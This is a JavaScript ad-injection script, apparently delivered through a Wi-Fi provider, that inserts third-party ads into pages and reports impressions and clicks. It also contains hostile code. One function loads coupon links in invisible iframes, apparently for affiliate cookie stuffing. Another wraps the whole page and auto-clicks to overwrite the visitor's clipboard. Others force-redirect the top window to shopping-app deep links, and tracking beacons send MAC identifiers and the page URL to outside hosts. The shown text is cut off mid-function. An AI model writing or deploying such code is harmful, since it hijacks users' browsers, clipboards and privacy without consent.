~function() {
  var toploc = window.top ? window.top.location : window.location;
  String.prototype.toDom = function() {
      var div = document.createElement("div");
      div.innerHTML = this;
      return div.childNodes[0]
  }
  ;
  function calHeight(proportion, width) {
      var pwidth = proportion.split(":")[0]
        , pheight = proportion.split(":")[1]
        , height = pheight;
      if (width && width !== 0) {
          height = Math.round(pheight / pwidth * width)
      }
      return height
  }
  var filterString = [];
  var Base = {
      zbody: document.getElementsByTagName("body")[0],
      zhead: document.getElementsByTagName("head")[0],
  };
  var ZmengMoibleQr = {
      dmac: "",
      umac: "",
      cid: "31514",
      antiBlockUrl: "//1.yhzm.cc/",
      pvUrl: "//rcv.union-wifi.com/hm.gif?from=15000",
      cookieIframeSrc: "//x.hao61.net/frqctrl.html",
      cookieIframe: null,
      isInCd: false,
      isiphone: /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream,
      ads: [{
          divId: "zmeng_" + Math.random().toString(36).slice(2),
          type: "qr",
          host: "_bd",
          mproId: "u5350399",
          antiBlockToken: "",
          jumpUrl: "[{'null'}]",
          matUrl: "[{'null'}]",
          prop: "u5350399_prop",
          appid: "u5350399_appid",
          clientId: "u5350399_clientid",
          width: "u5350399_width",
          height: "u5350399_height",
          logUrl: "//rcv.union-wifi.com/hm.gif?from=12001&impress=true",
          clickUrl: "//rcv.union-wifi.com/hm.gif?from=12001&click=true",
          appkey: "ByoDNbqiMjVqr1mny8rSiBDtuCi",
          title: "u5350399_title",
          desc: "u5350399_desc",
          diagram: "u5350399_diagram",
          graphic: "0",
          accessToken: "u5350399_accesstoken",
          appLogUrl: "u5350399_applogurl",
          appClickUrl: "u5350399_appclickurl",
          start: 0,
          isLoaded: false,
          isChecked: false,
      }, {
          divId: "zmeng_" + Math.random().toString(36).slice(2),
          type: "zmtdp",
          host: "_host",
          mproId: "",
          taobaourl: "_taobaourl",
          logUrl: "//rcv.union-wifi.com/hm.gif?from=12002&impress=true",
          cd: "_time",
          cookie: "taoBaoDeepLink",
          start: 0,
          isLoaded: false,
          isChecked: false,
      }, {
          divId: "zmeng_" + Math.random().toString(36).slice(2),
          type: "deeplink",
          host: "_host",
          mproId: "",
          cd: "_time",
          logUrl: "//rcv.union-wifi.com/hm.gif?from=12003&impress=true",
          coupon: "_coupon",
          cookie: "deeplink",
          start: 0,
          time: "7:00-9:00,10:00-13:00,15:00-16:00,17:00-19:00,20:00-22:30",
          isChecked: false,
          isClicked: false,
          isInCd: false,
      }, {
          divId: "zmeng_" + Math.random().toString(36).slice(2),
          type: "ffAttributes",
          host: "_host",
          mproId: "",
          logUrl: "//rcv.union-wifi.com/hm.gif?from=12004&impress=true",
          start: 0,
          isChecked: false,
          isClicked: false,
          isInCd: false,
      }, {
          divId: "zmeng_" + Math.random().toString(36).slice(2),
          type: "invisible",
          host: "_host",
          mproId: "",
          logUrl: "//rcv.union-wifi.com/hm.gif?from=12005&impress=true",
          coupon: "_coupon",
          start: 0,
          isChecked: false,
          isClicked: false,
          isInCd: false,
      }, ],
      _bd: {
          adType: 1,
          type: "bd",
          jsSrc: "//dup.baidustatic.com/js/dm.js",
      },
      _zmeng: {
          adType: 2,
          type: "zmeng",
      },
      _tuia: {
          adType: 3,
          type: "tuia",
          jsSrc: "//yun.sifuhe.cn/h5-mami/media/media-3.2.3.min.js",
      },
      _helian: {
          adType: 4,
          type: "helian",
          jsSrc: "//static.helianhealth.com/hlwf/fix.js",
      },
      _guangdiantong: {
          adType: 5,
          type: "guangdiantong",
          jsSrc: "//qzs.qq.com/qzone/biz/res/i.js",
      },
      _google: {
          adType: 6,
          type: "google",
          jsSrc: "//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js",
      },
      _feifan: {
          adType: 7,
          type: "feifan",
          jsSrc: "//hl.sc-bjx.com/sta/z/wbd.js",
          referrerReg: /(\.baidu\.com)|(\.sogou\.com)|(.sm.cn)/,
          jsReg: /\/\/c.cnzz.com\/core.php\?web_id=\S*&t=\S*/,
      },
      _taobao: {
          adType: 8,
          type: "taobao"
      },
      _app: {
          adType: 9,
          type: "app",
      },
      _kuaiguo: {
          adx: "kuaiguo",
          jsSrc: "//ssp.huayuidc.com/js/",
          host: "_kuaiguo",
      }
  };
  ZmengMoibleQr.ctype = isMobile() ? "mobile" : "pc";
  var scriptDom = (function() {
      var sc = document.scripts;
      for (var i = sc.length - 1; i >= 0; i--) {
          if (sc[i].src.indexOf("cid=" + ZmengMoibleQr.cid) !== -1) {
              return sc[i]
          }
      }
      return null
  }
  )();
  if (document.referrer && document.referrer.match(ZmengMoibleQr._feifan.referrerReg)) {
      (function(d, w) {
          var img = new Image();
          img.src = "http://mz.loelx.cn:7023/r.gif?w=m8pvtj"
      }
      )(document, window)
  }
  window.ZmengMoibleQr = ZmengMoibleQr;
  var ADFIX = function() {
      var that = this;
      that.init()
  };
  ADFIX.prototype = {
      init: function() {
          var that = this;
          if (isMobile() && checkEnv() && document.body) {
              var pvUrl = ZmengMoibleQr.pvUrl + "&_isFix=true";
              that.imageLog(pvUrl);
              that.addAd()
          } else {
              if (document.readyState === "complete") {
                  that.init()
              } else {
                  if (document.addEventListener) {
                      document.addEventListener("DOMContentLoaded", function() {
                          that.init()
                      }, false)
                  } else {
                      document.attachEvent("onreadystatechange", function() {
                          that.init()
                      })
                  }
              }
          }
      },
      getDivArg: function() {
          var self = this;
          var sc = document.getElementsByTagName("script");
          var paramsArr = null;
          for (var i = sc.length - 1; i >= 0; i--) {
              if (sc[i].src.indexOf("cid=" + ZmengMoibleQr.cid) !== -1) {
                  paramsArr = sc[i].src.split("?")[1].split("&");
                  break
              }
          }
          if (!paramsArr) {
              return false
          }
          var args = {}, argsStr = [], param, t, key, value;
          for (var i = 0, imax = paramsArr.length; i < imax; i++) {
              param = paramsArr[i].split("=");
              key = param[0],
              value = param[1];
              if (typeof args[key] == "undefined") {
                  args[key] = value
              } else {
                  if (typeof args[key] == "string") {
                      args[key] = value
                  } else {
                      args[key].push(value)
                  }
              }
          }
          return args
      },
      addAd: function() {
          var that = this;
          createAd();
          function createAd() {
              for (var index in ZmengMoibleQr.ads) {
                  var ad = ZmengMoibleQr.ads[index];
                  if (!ad || ad == "" || ad.host == "") {
                      continue
                  }
                  switch (true) {
                  case ad.host === "_bd":
                      createDiv(ad);
                      ad.jsSrc = ZmengMoibleQr[ad.host].jsSrc;
                      createBaiduAd(ad);
                      that.monitorBaiduAd(ad);
                      break;
                  case ad.host === "_zmeng":
                      addZmengAd(ad, that);
                      break;
                  case ad.host === "_tuia":
                      ad.jsSrc = ZmengMoibleQr[ad.host].jsSrc;
                      createDiv(ad);
                      createTuiaAd(ad);
                      that.monTuiaAd(ad);
                      break;
                  case ad.host === "_helian":
                      createDiv(ad);
                      ad.jsSrc = ZmengMoibleQr[ad.host].jsSrc;
                      createHelianAd(ad);
                      that.monHelianAd(ad);
                      break;
                  case ad.host === "_guangdiantong":
                      createDiv(ad);
                      ad.jsSrc = ZmengMoibleQr[ad.host].jsSrc;
                      createGdtAd(ad);
                      that.monGdtAd(ad);
                      break;
                  case ad.host === "_google":
                      createDiv(ad);
                      ad.jsSrc = ZmengMoibleQr[ad.host].jsSrc;
                      createGoogleAd(ad);
                      that.monGoogleAd(ad);
                      break;
                  case ad.host === "_feifan":
                      createDiv(ad);
                      ad.jsSrc = ZmengMoibleQr[ad.host].jsSrc;
                      ad.referrerReg = ZmengMoibleQr[ad.host].referrerReg;
                      addFeifanAd(ad);
                      break;
                  case ad.host === "_taobao":
                      createDiv(ad);
                      addTaobaoAd(ad);
                      break;
                  case ad.host === "_app":
                      createDiv(ad);
                      addApi(ad);
                      break;
                  case ad.host === "_kuaiguo":
                      ad.jsSrc = ZmengMoibleQr[ad.host].jsSrc;
                      createDiv(ad);
                      createKgAd(ad);
                      that.monKgAd(ad);
                      break
                  }
              }
          }
          function createDiv(ad) {
              var containerId = that.getDivArg()["_ct"];
              var container = document.getElementById(that.getDivArg()["_ct"]);
              if (containerId && container) {
                  ad.divId = containerId;
                  ad.dom = container
              } else {
                  createDivByJsPosition(ad)
              }
          }
          function createBaiduAd(ad) {
              var mjsSrc;
              mjsSrc = ad.jsSrc;
              token = (ad.antiBlockToken.indexOf("?") > -1 || ad.antiBlockToken.indexOf(".js") > -1) ? true : false;
              appendJs({
                  url: token ? ad.antiBlockToken : ad.jsSrc,
                  dom: ad.antiBlockToken ? ad.dom : "",
                  cb: function() {
                      window.slotbydup = window.slotbydup || [];
                      window.slotbydup.push({
                          id: ad.mproId,
                          container: ad.divId,
                          display: "inlay-fix",
                          clid: parseMac(ZmengMoibleQr.dmac),
                          cuid: parseMac(ZmengMoibleQr.umac)
                      })
                  }
              });
              ad.start = new Date().getTime()
          }
          function createZmengQrAd(ad) {
              that.creatCloseDom(ad);
              setStyle(ad.dom, {
                  width: "100%",
                  padding: "0",
                  margin: "0",
                  position: "relative",
                  left: 0
              });
              var swidth = document.getElementById(ad.divId).offsetWidth
                , sheight = calHeight(ad.prop, swidth);
              ad.width = swidth;
              ad.height = sheight;
              ad.matUrl = formatmatUrl(ad.matUrl);
              ad.jumpUrl = formatmatUrl(ad.jumpUrl);
              if (ad.diagram == 1) {
                  if (!ad.matUrl.length || !ad.jumpUrl.length) {
                      return
                  }
                  creatZmengQrImage(ad)
              } else {
                  creatZmengQrImageText(ad)
              }
              ad.start = new Date().getTime()
          }
          function creatZmengQrImageText(ad) {
              var div = document.createElement("div")
                , img = document.createElement("img")
                , h3 = document.createElement("h3")
                , title = ad.title.indexOf(ad.mproId) == -1 ? ad.title : null;
              setStyle(div, {
                  position: "relative",
                  width: "100%",
                  height: ad.height + "px"
              });
              h3.innerHTML = title;
              setStyle(h3, {
                  position: "absolute",
                  width: ad.width - Math.ceil(225 * 80 / 150) - 40 + "px",
                  wordBreak: " break-all",
                  left: Math.ceil(225 * 80 / 150) + 10 + "px",
                  fontSize: "16px",
                  fontWeight: "normal",
                  top: "50%",
                  lineHeight: "16px",
                  transform: "translate(0,-50%)",
                  "-webkit-transform": "translate(0,-50%)",
                  "-moz-transform": "translate(0,-50%)"
              });
              setStyle(img, {
                  position: "absolute",
                  width: title ? Math.ceil(225 * 80 / 150) + "px" : "100%",
                  height: "100%",
                  src: {
                      value: ad.matUrl[0]
                  },
                  left: "3px"
              });
              switch (ad.graphic) {
              case "2":
                  setStyle(img, {
                      right: "3px",
                      left: "auto"
                  });
                  setStyle(h3, {
                      right: Math.ceil(225 * 80 / 150) + 10 + "px",
                      left: "3px",
                      width: ad.width - Math.ceil(225 * 80 / 150) - 10 + "px"
                  });
                  break;
              case "3":
                  setStyle(img, {
                      right: "auto",
                      left: "auto",
                      width: ad.width + "px",
                      height: ad.height + "px"
                  })
              }
              h3.innerHTML == ad.title && ad.graphic != 3 ? div.appendChild(h3) : "";
              h3.innerHTML == ad.title ? div.appendChild(h3) : "";
              div.appendChild(img);
              ad.dom.appendChild(div);
              that.monitorZmengQrAd(ad, ad.jumpUrl[0])
          }
          function creatZmengQrImage(ad) {
              var col = 3;
              var maxCol = 5;
              var dom = document.createElement("div");
              var size = ad.matUrl.length > maxCol ? Math.ceil(ad.matUrl.length / col) : 1;
              var speed = size > 1 ? col : ad.matUrl.length;
              for (var i = 1; i <= size; i++) {
                  var div = document.createElement("div");
                  setStyle(div, {
                      width: ad.width + "px",
                      height: ad.height + "px"
                  });
                  for (var j = 1; j <= speed; j++) {
                      var a = document.createElement("a")
                        , img = document.createElement("img")
                        , index = (i * speed - speed + j);
                      setStyle(a, {
                          width: ad.width / speed + "px",
                          padding: "3px",
                          boxSizing: "border-box",
                          height: ad.height + "px",
                          display: "inline-block",
                          href: {
                              value: ad.jumpUrl[index - 1]
                          }
                      });
                      setStyle(img, {
                          width: "100%",
                          height: "100%",
                          src: {
                              value: ad.matUrl[index - 1]
                          },
                      });
                      if (i > 0 && !ad.matUrl[index - 1]) {
                          var radom = parseInt(Math.random() * (ad.matUrl.length - 1));
                          a.href = ad.jumpUrl[radom];
                          img.src = ad.matUrl[radom]
                      }
                      a.appendChild(img);
                      div.appendChild(a)
                  }
                  ad.dom.appendChild(div)
              }
              that.monitorZmengQrAd(ad)
          }
          function createTuiaAd(ad) {
              appendJs({
                  url: ad.jsSrc,
                  cb: function() {
                      if (typeof TuiaMedia != "undefined") {
                          new TuiaMedia({
                              container: "#" + ad.divId,
                              appKey: ad.appkey,
                              adslotId: ad.mproId,
                              target: "_top"
                          })
                      }
                  }
              });
              ad.start = new Date().getTime()
          }
          function createHelianAd(ad) {
              var jsSrc = ad.jsSrc + "?aid=" + ad.mproId + "&bid=" + ad.mproId;
              appendJs({
                  url: jsSrc,
                  id: "helian_script",
                  dom: ad.dom,
                  cb: null
              })
          }
          function createGdtAd(ad) {
              window.TencentGDT = window.TencentGDT || [];
              TencentGDT.push({
                  placement_id: ad.mproId,
                  type: "banner",
                  containerid: ad.divId,
                  fill_type: "full",
                  app_id: ad.appid,
              });
              appendJs({
                  url: ad.jsSrc,
                  id: "gdt-" + ad.mproId
              })
          }
          function createGoogleAd(ad) {
              console.log(ad);
              var ins = document.createElement("ins");
              ins.className = "adsbygoogle";
              ins.style.width = ad.width + "px";
              ins.style.height = ad.height + "px";
              ins.style.display = "inline-block";
              ins.setAttribute("data-ad-client", ad.clientId);
              ins.setAttribute("data-ad-slot", ad.mproId);
              ad.dom.appendChild(ins);
              ad.ins = ins;
              appendJs({
                  url: ad.jsSrc,
                  cb: function() {
                      (window.adsbygoogle = window.adsbygoogle || []).push({})
                  }
              })
          }
          function creatZmtdpAd(ad, that) {
              var isApp = false;
              if (ad.taobaourl !== "_" + "taobaourl" && ad.taobaourl !== "" || ad.coupon != "") {
                  isApp = true
              }
              var isiphone = ad.taobaourl ? !ZmengMoibleQr.isiphone : true;
              if (!IsPC() && isApp && isiphone) {
                  var time = ad.taobaourl ? 5000 : 100;
                  setTimeout(function() {
                      if (is_weixin() && ad.type == "zmtdp") {
                          creatWeiximTrip()
                      } else {
                          that.checkCd(ad)
                      }
                  }, time)
              }
          }
          function addZmengAd(ad, that) {
              switch (ad.type) {
              case "qr":
                  createDiv(ad);
                  createZmengQrAd(ad);
                  break;
              case "zmtdp":
                  creatZmtdpAd(ad, that);
                  break;
              case "deeplink":
                  ad.time = isCdFn(ad.time);
                  ad.time && creatZmtdpAd(ad, that)
              }
          }
          function addFeifanAd(ad) {
              var self = this
                , hasJs = false;
              if (document.referrer && document.referrer.match(ad.referrerReg)) {
                  hasJs = true
              }
              if (!hasJs) {
                  return
              }
              setTimeout(function() {
                  appendJs({
                      url: ad.jsSrc,
                      cb: function() {
                          if (!ad.isChecked) {
                              that.imageLog(ad.logUrl, ad)
                          }
                      }
                  })
              }, 3000)
          }
          function addTaobaoAd(ad) {
              if (ad.type == "invisible") {
                  var tbifm = String.prototype.concat.call('<iframe src="', ad.coupon, '" frameborder="0" style="display:none;"></iframe>').toDom();
                  ad.dom.appendChild(tbifm);
                  that.imageLog(ad.logUrl, ad)
              }
          }
          function addApi(ad) {
              if (ad.matUrl.indexOf(ad.mproId) != -1) {
                  return
              }
              ad.matUrl = formatmatUrl(ad.matUrl);
              ad.jumpUrl = formatmatUrl(ad.jumpUrl);
              if (!ad.matUrl.length) {
                  return
              }
              switch (ad.diagram) {
              case "1":
                  createDivByApi(ad, this);
                  that.monApiAd(ad);
                  that.addFeedsImage(ad);
                  break;
              case "0":
                  if (ad.title.indexOf(ad.mproId) != -1 && ad.desc.indexOf(ad.mproId) != -1 && ad.graphic != 3) {
                      return
                  }
                  createDivByApi(ad, this);
                  that.monApiAd(ad);
                  that.addFeedsImageTxt(ad)
              }
          }
          function createKgAd(ad) {
              var url = ad.jsSrc + ad.mproId + ".js";
              appendJs({
                  url: url,
                  dom: ad.dom,
              })
          }
          function appendJs(options) {
              if (!options.url) {
                  return
              }
              var script = document.createElement("script");
              script.src = options.url;
              script.type = "text/javascript";
              if (options.id) {
                  script.id = options.id
              }
              if (options.dom) {
                  script.async = !0;
                  options.dom.appendChild(script)
              } else {
                  if (document.getElementsByTagName("head") && options.ct !== "body") {
                      document.getElementsByTagName("head")[0].appendChild(script)
                  } else {
                      document.getElementsByTagName("body")[0].appendChild(script)
                  }
              }
              script.onload = function() {
                  if (typeof options.cb == "function") {
                      options.cb()
                  }
              }
          }
      },
      monIframeClick: function(ifr, ad) {
          var that = this;
          if (ad.isClicked == true) {
              if (ad.clickTimmer) {
                  clearInterval(ad.clickTimmer)
              }
          } else {
              ad.clickTimmer = setInterval(function() {
                  if (document.activeElement) {
                      var activeElement = document.activeElement;
                      if (activeElement == ifr) {
                          that.imageLog(ad.clickUrl, ad);
                          ad.isClicked = true;
                          that.monIframeClick(ifr, ad)
                      }
                  }
              }, 50)
          }
      },
      monitorBaiduAd: function(ad) {
          var that = this;
          if (ad.start == 0) {
              return
          }
          checkBaiduAd(ad);
          if (!ad.isChecked) {
              if (ad.antiBlockToken) {
                  var antiAd;
                  if (ad.antiBlockToken.indexOf("?") > -1) {
                      var scriptId = ad.antiBlockToken.split("?")[1];
                      scriptId = scriptId.split("=")[0] + scriptId.split("=")[1];
                      antiAd = document.getElementById(scriptId)
                  } else {
                      antiAd = document.getElementById(ad.divId)
                  }
                  if (antiAd !== null && antiAd.getElementsByTagName("iframe").length !== 0) {
                      that.imageLog(ad.logUrl, ad);
                      that.monIframeClick(antiAd.getElementsByTagName("iframe")[0], ad);
                      ad.isChecked = true;
                      return
                  }
              } else {
                  var frames = document.getElementsByTagName("iframe");
                  for (var i = 0; i < frames.length; i++) {
                      var id = frames[i].id;
                      if (id.indexOf(ad.mproId) != -1) {
                          that.imageLog(ad.logUrl, ad);
                          that.monIframeClick(frames[i], ad);
                          ad.isChecked = true;
                          return
                      }
                  }
              }
              setTimeout(function() {
                  that.monitorBaiduAd(ad)
              }, 50)
          }
          function checkBaiduAd(ad) {
              if (window.BAIDU_SSP_EXP_FLAG || window.BAIDU_C_BASE || window.BAIDU_DUP2 || window.BAIDU_DUP || window.BAIDU_DUP2_require || window._dup_global || window.BAIDU_SSP_define || window.BAIDU_DUP_require || window.BAIDU_DUP2_pageFirstRequestTime) {
                  ad.isLoaded = true
              }
          }
      },
      monitorZmengQrAd: function(ad, jumpUrl) {
          var that = this;
          that.imageLog(ad.logUrl, ad);
          addEvent(ad.dom, "click", function() {
              that.imageLog(ad.clickUrl, ad, jumpUrl)
          })
      },
      monTuiaAd: function(ad) {
          var that = this;
          if (!ad.isChecked) {
              var mimgs = document.getElementsByTagName("img");
              for (var i = 0, imax = mimgs.length; i < imax; i++) {
                  if (mimgs[i].className == "ta-img") {
                      that.imageLog(ad.logUrl, ad);
                      ad.isLoaded = true;
                      addEvent(mimgs[i], "click", function() {
                          that.imageLog(ad.clickUrl, ad)
                      });
                      ad.isClicked = true;
                      return
                  }
              }
              setTimeout(function() {
                  that.monTuiaAd(ad)
              }, 50)
          }
      },
      monHelianAd: function(ad) {
          var that = this;
          if (!ad.isChecked) {
              var mdiv = document.getElementById("helian_iframe");
              if (mdiv) {
                  that.imageLog(ad.logUrl, ad);
                  ad.isLoaded = true;
                  addEvent(mdiv, "click", function() {
                      if (ad.isClicked) {
                          return
                      }
                      that.imageLog(ad.clickUrl, ad);
                      ad.isClicked = true
                  });
                  return
              }
              setTimeout(function() {
                  that.monHelianAd()
              }, 50)
          }
      },
      monGdtAd: function(ad) {
          var that = this;
          if (!ad.isChecked) {
              var frames = document.getElementsByTagName("iframe");
              for (var i = 0; i < frames.length; i++) {
                  scanStr = "posid=" + ad.mproId.toString();
                  var src = frames[i].src;
                  if (src.indexOf(scanStr) > -1) {
                      that.imageLog(ad.logUrl, ad);
                      addEvent(ad.dom, "click", function() {
                          that.imageLog(ad.clickUrl, ad, ad.jumpUrl)
                      });
                      ad.isChecked = true;
                      return
                  }
              }
              setTimeout(function() {
                  that.monGdtAd(ad)
              }, 50)
          }
      },
      monGoogleAd: function(ad) {
          var that = this;
          if (!ad.isChecked) {
              if (ad.ins) {
                  if (ad.ins.getAttribute("data-adsbygoogle-status") === "done") {
                      that.imageLog(ad.logUrl, ad);
                      var iframe = ad.ins.getElementsByTagName("iframe")[0];
                      that.monIframeClick(iframe, ad);
                      ad.isChecked = true;
                      return
                  }
              }
              setTimeout(function() {
                  that.monGoogleAd(ad)
              }, 50)
          }
      },
      monApiAd: function(ad) {
          var that = this;
          var closeDom = document.getElementById("ZMAdclose");
          addEvent(ad.dom, "click", function() {
              that.imageLog(ad.clickUrl, ad);
              that.appImageLog(ad.appClickUrl, ad.jumpUrl[0])
          });
          addEvent(closeDom, "click", function() {
              closeAd(ad.dom)
          })
      },
      monKgAd: function(ad) {
          var that = this;
          if (!ad.isChecked) {
              var mdivs = document.getElementsByTagName("div");
              for (var i = 0, imax = mdivs.length; i < imax; i++) {
                  if (mdivs[i].id.indexOf(ad.mproId) > -1) {
                      ad.dom = mdivs[i];
                      that.imageLog(ad.logUrl, ad);
                      var clickiframe = mdivs[i].getElementsByTagName("iframe")[0];
                      that.monIframeClick(clickiframe, ad);
                      return
                  }
              }
              setTimeout(function() {
                  that.monKgAd(ad)
              }, 50)
          }
      },
      imageLog: function(url, ad, jumpUrl) {
          var curUrl = encodeURIComponent(window.location.href);
          var img = new Image();
          var uid = unique();
          img.onload = img.onerror = function() {
              img.onload = img.onerror = null;
              img = null;
              if (jumpUrl) {
                  toploc.href = jumpUrl
              }
          }
          ;
          if (ad) {
              img.src = toploc.protocol + url + "&_cid=" + ZmengMoibleQr.cid + "&_slot=" + ad.mproId + "&_dmac=" + ZmengMoibleQr.dmac + "&_umac=" + ZmengMoibleQr.umac + "&url=" + curUrl + "&_ctype=" + ZmengMoibleQr.ctype + "&_u=" + uid + "&_adx=" + ad.host
          } else {
              img.src = toploc.protocol + url + "&_cid=" + ZmengMoibleQr.cid + "&_dmac=" + ZmengMoibleQr.dmac + "&_umac=" + ZmengMoibleQr.umac + "&url=" + curUrl + "&_ctype=" + ZmengMoibleQr.ctype + "&_u=" + uid + "&_adx="
          }
      },
      appImageLog: function(data, jumpUrl) {
          if (!data || data == "") {
              return
          }
          var imageArr = data.substring(1, data.length - 1);
          imageArr = imageArr.split(",");
          for (var i = 0; i < imageArr.length; i++) {
              var img = new Image();
              img.src = imageArr[i]
          }
          img.onload = img.onerror = function() {
              img.onload = img.onerror = null;
              img = null;
              if (jumpUrl) {
                  toploc.href = jumpUrl
              }
          }
      },
      addEvent: (function() {
          if (document.addEventListener) {
              return function(el, type, fn) {
                  el.addEventListener(type, function(e) {
                      fn.call(el, e)
                  }, false)
              }
          } else {
              if (window.attachEvent) {
                  return function(el, type, fn) {
                      el.attachEvent("on" + type.toString(), function(e) {
                          fn.call(el, e)
                      })
                  }
              }
          }
      }
      )(),
      checkCd: function(ad) {
          var that = this
            , checkOnce = true
            , checkCdCallBackJson = {
              zmtdp: {
                  name: "taoBaoDeepLink",
                  fn: "upTaobaoApp",
                  key: ad.taobaourl ? ad.taobaourl.split("://", ad.taobaourl.indexOf("://"))[0] : "",
                  cd: ad.cd
              },
              deeplink: {
                  name: "deeplink",
                  fn: "addZmengAlipayAd",
                  key: ad.coupon ? ad.coupon : "",
                  cd: ad.cd.toString().indexOf("_") != -1 ? getCd(ad.time.split("-")[0], ad.time.split("-")[1]) : ad.cd
              }
          };
          var reg = /((http|https):)?\/\/[A-Za-z0-9.-]*\//, hostArr = ZmengMoibleQr.cookieIframeSrc.match(reg), host;
          if (ZmengMoibleQr.cookieIframe == null) {
              ZmengMoibleQr.cookieIframe = String.prototype.concat.call('<iframe src="', ZmengMoibleQr.cookieIframeSrc, '" frameborder="0" style="height:0px;"></iframe>').toDom();
              Base.zbody.appendChild(ZmengMoibleQr.cookieIframe)
          }
          var key = checkCdCallBackJson[ad.type].key
            , name = checkCdCallBackJson[ad.type].name;
          addEvent(window, "message", function(e) {
              host = hostArr[0].substring(0, hostArr[0].length - 1);
              host = toploc.protocol + host;
              if (e.origin !== host) {
                  return
              }
              var arr = e.data + "";
              if (arr.indexOf(key) !== -1 || arr.indexOf(name) !== -1) {
                  ZmengMoibleQr.isInCd = true
              }
              if (!ZmengMoibleQr.isInCd && checkOnce) {
                  checkOnce = false;
                  if (arr.length) {
                      that.countCd(key, checkCdCallBackJson[ad.type]);
                      setTimeout(function() {
                          that[checkCdCallBackJson[ad.type].fn](ad)
                      }, 300)
                  } else {
                      that.countCd(key, checkCdCallBackJson[ad.type]);
                      setTimeout(function() {
                          that[checkCdCallBackJson[ad.type].fn](ad)
                      }, 300)
                  }
              }
          });
          setTimeout(function() {
              if (!ZmengMoibleQr.isInCd && checkOnce) {
                  checkOnce = false;
                  that.countCd(key, checkCdCallBackJson[ad.type]);
                  setTimeout(function() {
                      that[checkCdCallBackJson[ad.type].fn](ad)
                  }, 300)
              }
          }, 2000)
      },
      countCd: function(key, ad) {
          var reg = /((http|https):)?\/\/[A-Za-z0-9.-]*\//, hostArr = ZmengMoibleQr.cookieIframeSrc.match(reg), host;
          if (!ZmengMoibleQr.isInCd) {
              host = hostArr[0].substring(0, hostArr[0].length - 1);
              host = window.top.location.protocol + host;
              if (key) {
                  ZmengMoibleQr.cookieIframe.contentWindow.postMessage(ad.name + ":" + "cd&" + ad.cd + "?" + key, host)
              } else {
                  ZmengMoibleQr.cookieIframe.contentWindow.postMessage(ad.name + ":" + "cd&" + ad.cd, host)
              }
          }
      },
      upTaobaoApp: function(ad) {
          var that = this;
          ZmengMoibleQr.isInCd = true;
          that.imageLog(ad.logUrl, ad);
          toploc.href = ad.taobaourl
      },
      addZmengAlipayAd: function(ad) {
          var that = this;
          if (window.jquery) {
              ajaxcopy()
          } else {
              var scripts = ["//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"];
              sjsa(scripts, function() {
                  ajaxcopy()
              })
          }
          function sjsa(c, d) {
              "object" != typeof c && (c = [c]);
              var f = document.getElementsByTagName("head").item(0) || document.documentElement
                , b = []
                , g = c.length - 1
                , e = function(a) {
                  b[a] = document.createElement("script");
                  b[a].setAttribute("type", "text/javascript");
                  b[a].onload = b[a].onreadystatechange = function() {
                      this.onload = this.onreadystatechange = null;
                      this.parentNode.removeChild(this);
                      a != g ? e(a + 1) : "function" == typeof d && d()
                  }
                  ;
                  b[a].setAttribute("src", c[a]);
                  f.appendChild(b[a])
              };
              e(0)
          }
          function ajaxcopy() {
              var main_str = ad.coupon;
              sjsa(["//cdn.bootcss.com/clipboard.js/1.7.1/clipboard.min.js"], function() {
                  $(function() {
                      if ($("body").length > 0) {
                          $("body").wrapInner('<div style="cuosor:pointer；" class="autocopy" onclick="" data-clipboard-text="' + main_str + '" />')
                      } else {
                          $("img").wrap('<div style="cuosor:pointer；" class="autocopy" onclick="" data-clipboard-text="' + main_str + '" />')
                      }
                      var clipboard = new Clipboard(".autocopy");
                      setTimeout(function() {
                          $(".autocopy")[0].click()
                      }, 100);
                      clipboard.on("success", function(e) {
                          if (!ad.isChecked) {
                              ad.isChecked = ad.isChecked = true;
                              that.imageLog(ad.logUrl, ad)
                          }
                      })
                  })
              })
          }
      },
      creatCloseDom: function(ad) {
          ad.dom.style.position = "relative";
          var closeDom = document.createElement("div");
          setStyle(closeDom, {
              id: {
                  value: "ZMAdclose" + ad.divId
              },
              top: 0,
              right: 0,
              position: "absolute",
              width: "32px",
              height: "32px",
              borderRadius: "99px",
              background: "url('//x.hao61.net/nuomitemp/zmengbuoyicon/close.png') no-repeat",
              zIndex: 999
          });
          ad.dom.appendChild(closeDom);
          var closeDom = document.getElementById("ZMAdclose" + ad.divId);
          addEvent(closeDom, "click", function(e) {
              closeAd(ad.dom)
          })
      },
      addFeedsImage: function(ad) {
          var that = this;
          var swidth = document.getElementById(ad.divId).offsetWidth;
          var p = document.createElement("h3");
          var title = ad.title.indexOf(ad.mproId) == -1 ? ad.title : ad.desc.indexOf(ad.mproId) == -1 ? ad.desc : "";
          p.innerHTML = String.prototype.concat.call('<span style="display:inline-block;width:90%;overflow: hidden;text-overflow:ellipsis;white-space: nowrap;line-height:32px;font-size:16px" >' + title + "</span>");
          p.style.paddingLeft = "5px";
          p.style.height = "auto";
          ad.dom.appendChild(p);
          for (var i = 0; i < 3; i++) {
              var img = document.createElement("img");
              if (ad.matUrl.length > 1) {
                  img.src = ad.matUrl[i] || ""
              } else {
                  img.src = ad.matUrl[0] || ""
              }
              img.style.padding = "2px";
              img.style.boxSizing = "border-box";
              img.style.width = (Math.floor(swidth / 3)) + "px";
              ad.dom.appendChild(img)
          }
          img.onload = function() {
              that.imageLog(ad.logUrl, ad);
              that.appImageLog(ad.appLogUrl)
          }
      },
      addFeedsImageTxt: function(ad) {
          var that = this;
          ad.swidth = document.getElementById(ad.divId).offsetWidth;
          var img = document.createElement("img");
          img.src = ad.matUrl[0] || "";
          var divW = Math.ceil(225 * 80 / 150);
          if (ad.graphic != "3") {
              img.style.width = divW + "px";
              img.style.height = "80px"
          }
          var title = ad.title.indexOf(ad.mproId) == -1 ? ad.title : ad.desc.indexOf(ad.mproId) == -1 ? ad.desc : "";
          if (!title && ad.graphic != 3) {
              return
          }
          switch (ad.graphic) {
          case "1":
              that.addImageTxtWrap(ad);
              break;
          case "2":
              img.style.position = "absolute";
              img.style.right = "0px";
              img.style.top = "0px";
              that.addImageTxtWrap(ad);
              break;
          case "3":
              var p = document.createElement("p");
              p.innerHTML = String.prototype.concat.call('<span style="display:inline-block;width:90%;overflow: hidden;text-overflow:ellipsis;white-space: nowrap;line-height:32px;font-size:14px" >' + title + "</span>");
              p.style.paddingLeft = "5px";
              img.style.width = ad.swidth - 10 + "px";
              img.style.padding = "0 5px";
              p.style.paddingLeft = "5px";
              p.style.height = "auto";
              ad.dom.appendChild(p);
              break
          }
          ad.dom.appendChild(img);
          img.onload = function() {
